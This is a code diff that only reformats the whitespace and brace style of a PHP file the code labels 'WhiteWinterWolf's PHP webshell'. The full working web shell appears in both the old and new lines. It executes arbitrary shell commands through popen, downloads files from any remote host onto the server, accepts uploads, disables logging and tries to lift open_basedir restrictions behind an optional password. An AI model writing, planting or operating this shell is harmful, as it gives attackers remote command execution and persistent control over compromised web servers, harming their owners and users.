@@ -27,96 +27,79 @@
 $passprompt = "WhiteWinterWolf's PHP webshell: ";
 $passhash = "";
 
-function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }
+function e($s)
+{
+    echo htmlspecialchars($s, ENT_QUOTES);
+}
 
 function h($s)
 {
-	global $passprompt;
-	if (function_exists('hash_hmac'))
-	{
-		return hash_hmac('sha256', $s, $passprompt);
-	}
-	else
-	{
-		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
-	}
+    global $passprompt;
+    if (function_exists('hash_hmac')) {
+        return hash_hmac('sha256', $s, $passprompt);
+    } else {
+        return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
+    }
 }
 
 function fetch_fopen($host, $port, $src, $dst)
 {
-	global $err, $ok;
-	$ret = '';
-	if (strpos($host, '://') === false)
-	{
-		$host = 'http://' . $host;
-	}
-	else
-	{
-		$host = str_replace(array('ssl://', 'tls://'), 'https://', $host);
-	}
-	$rh = fopen("${host}:${port}${src}", 'rb');
-	if ($rh !== false)
-	{
-		$wh = fopen($dst, 'wb');
-		if ($wh !== false)
-		{
-			$cbytes = 0;
-			while (! feof($rh))
-			{
-				$cbytes += fwrite($wh, fread($rh, 1024));
-			}
-			fclose($wh);
-			$ret .= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
-		}
-		else
-		{
-			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
-		}
-		fclose($rh);
-	}
-	else
-	{
-		$ret = "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";
-	}
-	return $ret;
+    global $err, $ok;
+    $ret = '';
+    if (strpos($host, '://') === false) {
+        $host = 'http://' . $host;
+    } else {
+        $host = str_replace(array('ssl://', 'tls://'), 'https://', $host);
+    }
+    $rh = fopen("${host}:${port}${src}", 'rb');
+    if ($rh !== false) {
+        $wh = fopen($dst, 'wb');
+        if ($wh !== false) {
+            $cbytes = 0;
+            while (! feof($rh)) {
+                $cbytes += fwrite($wh, fread($rh, 1024));
+            }
+            fclose($wh);
+            $ret .= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
+        } else {
+            $ret .= "${err} Failed to open file <i>${dst}</i><br />";
+        }
+        fclose($rh);
+    } else {
+        $ret = "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";
+    }
+    return $ret;
 }
 
 function fetch_sock($host, $port, $src, $dst)
 {
-	global $err, $ok;
-	$ret = '';
-	$host = str_replace('https://', 'tls://', $host);
-	$s = fsockopen($host, $port);
-	if ($s)
-	{
-		$f = fopen($dst, 'wb');
-		if ($f)
-		{
-			$buf = '';
-			$r = array($s);
-			$w = NULL;
-			$e = NULL;
-			fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
-			while (stream_select($r, $w, $e, 5) && !feof($s))
-			{
-				$buf .= fread($s, 1024);
-			}
-			$buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
-			fwrite($f, $buf);
-			fclose($f);
-			$ret .= "${ok} Fetched file <i>${dst}</i> (" . strlen($buf) . " bytes)<br />";
-		}
-		else
-		{
-			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
-		}
-		fclose($s);
-	}
-	else
-	{
-		$ret .= "${err} Failed to connect to <i>${host}:${port}</i><br />";
-	}
-	return $ret;
+    global $err, $ok;
+    $ret = '';
+    $host = str_replace('https://', 'tls://', $host);
+    $s = fsockopen($host, $port);
+    if ($s) {
+        $f = fopen($dst, 'wb');
+        if ($f) {
+            $buf = '';
+            $r = array($s);
+            $w = null;
+            $e = null;
+            fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
+            while (stream_select($r, $w, $e, 5) && !feof($s)) {
+                $buf .= fread($s, 1024);
+            }
+            $buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
+            fwrite($f, $buf);
+            fclose($f);
+            $ret .= "${ok} Fetched file <i>${dst}</i> (" . strlen($buf) . " bytes)<br />";
+        } else {
+            $ret .= "${err} Failed to open file <i>${dst}</i><br />";
+        }
+        fclose($s);
+    } else {
+        $ret .= "${err} Failed to connect to <i>${host}:${port}</i><br />";
+    }
+    return $ret;
 }
 
 ini_set('log_errors', '0');
@@ -125,12 +108,11 @@ error_reporting(E_ALL);
 
 while (@ ob_end_clean());
 
-if (! isset($_SERVER))
-{
-	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
-	$_FILES = &$HTTP_POST_FILES;
-	$_POST = &$HTTP_POST_VARS;
-	$_SERVER = &$HTTP_SERVER_VARS;
+if (! isset($_SERVER)) {
+    global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
+    $_FILES = &$HTTP_POST_FILES;
+    $_POST = &$HTTP_POST_VARS;
+    $_SERVER = &$HTTP_SERVER_VARS;
 }
 
 $auth = '';
@@ -147,77 +129,60 @@ $ok = '&#9786; :';
 $warn = '&#9888; :';
 $err = '&#9785; :';
 
-if (! empty($passhash))
-{
-	if (function_exists('hash_hmac') || function_exists('mhash'))
-	{
-		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
-		if (h($auth) !== $passhash)
-		{
-			?>
+if (! empty($passhash)) {
+    if (function_exists('hash_hmac') || function_exists('mhash')) {
+        $auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
+        if (h($auth) !== $passhash) {
+            ?>
 				<form method="post" action="<?php e($url); ?>">
 					<?php e($passprompt); ?>
 					<input type="password" size="15" name="pass">
 					<input type="submit" value="Send">
 				</form>
 			<?php
-			exit;
-		}
-	}
-	else
-	{
-		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
-	}
+            exit;
+        }
+    } else {
+        $status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
+    }
 }
 
-if (! ini_get('allow_url_fopen'))
-{
-	ini_set('allow_url_fopen', '1');
-	if (! ini_get('allow_url_fopen'))
-	{
-		if (function_exists('stream_select'))
-		{
-			$fetch_func = 'fetch_sock';
-		}
-		else
-		{
-			$fetch_func = '';
-			$status .= "${warn} File fetching disabled ('allow_url_fopen'"
-				. " disabled and 'stream_select()' missing).<br />";
-		}
-	}
+if (! ini_get('allow_url_fopen')) {
+    ini_set('allow_url_fopen', '1');
+    if (! ini_get('allow_url_fopen')) {
+        if (function_exists('stream_select')) {
+            $fetch_func = 'fetch_sock';
+        } else {
+            $fetch_func = '';
+            $status .= "${warn} File fetching disabled ('allow_url_fopen'"
+                . " disabled and 'stream_select()' missing).<br />";
+        }
+    }
 }
-if (! ini_get('file_uploads'))
-{
-	ini_set('file_uploads', '1');
-	if (! ini_get('file_uploads'))
-	{
-		$status .= "${warn} File uploads disabled.<br />";
-	}
+if (! ini_get('file_uploads')) {
+    ini_set('file_uploads', '1');
+    if (! ini_get('file_uploads')) {
+        $status .= "${warn} File uploads disabled.<br />";
+    }
 }
-if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
-{
-	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
+if (ini_get('open_basedir') && ! ini_set('open_basedir', '')) {
+    $status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
 }
 
-if (! chdir($cwd))
-{
-  $cwd = getcwd();
+if (! chdir($cwd)) {
+    $cwd = getcwd();
 }
 
-if (! empty($fetch_func) && ! empty($fetch_path))
-{
-	$dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
-	$status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
+if (! empty($fetch_func) && ! empty($fetch_path)) {
+    $dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
+    $status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
 }
 
-if (ini_get('file_uploads') && ! empty($_FILES['upload']))
-{
-	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
-	if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
-	{
-		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
-	}
+if (ini_get('file_uploads') && ! empty($_FILES['upload'])) {
+    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
+    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
+        $status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
+    }
 }
 ?>
 
@@ -265,30 +230,24 @@ if (ini_get('file_uploads') && ! empty($_FILES['upload']))
 <hr />
 
 <?php
-if (! empty($status))
-{
-	echo "<p>${status}</p>";
+if (! empty($status)) {
+    echo "<p>${status}</p>";
 }
 
 echo "<pre>";
-if (! empty($cmd))
-{
-	echo "<b>";
-	e($cmd);
-	echo "</b>\n";
-	if (DIRECTORY_SEPARATOR == '/')
-	{
-		$p = popen('exec 2>&1; ' . $cmd, 'r');
-	}
-	else
-	{
-		$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
-	}
-	while (! feof($p))
-	{
-		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
-		@ flush();
-	}
+if (! empty($cmd)) {
+    echo "<b>";
+    e($cmd);
+    echo "</b>\n";
+    if (DIRECTORY_SEPARATOR == '/') {
+        $p = popen('exec 2>&1; ' . $cmd, 'r');
+    } else {
+        $p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
+    }
+    while (! feof($p)) {
+        echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
+        @ flush();
+    }
 }
 echo "</pre>";
 
